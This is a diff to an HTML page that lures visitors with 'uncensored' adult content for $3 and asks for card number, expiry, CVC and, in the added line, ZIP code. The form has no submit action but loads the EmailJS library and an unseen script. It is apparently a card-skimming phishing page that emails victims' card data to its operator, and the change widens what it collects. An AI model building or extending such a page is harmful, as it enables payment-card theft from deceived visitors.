@@ -1,21 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kinky content</title>
+  <title>Kinky Content</title>
   <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
 
   <div class="container">
-    <h2>Access to uncensored content.</h2>
+    <h2>Access to Uncensored Content</h2>
     <form id="paymentForm">
       <input type="text" id="cardNumber" placeholder="Card Number" required>
       <input type="text" id="expDate" placeholder="MM/YY" required>
       <input type="text" id="cvc" placeholder="CVC" required>
-
-
+      <input type="text" id="zipCode" placeholder="ZIP Code" required> <!-- Added ZIP Code field -->
       <p id="errorMessage" class="error"></p>
       <button type="button" id="payButton">Pay $3</button>
     </form>
@@ -24,6 +25,7 @@
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <script src="script.js"></script>
 </body>
+
 </html>
 
 
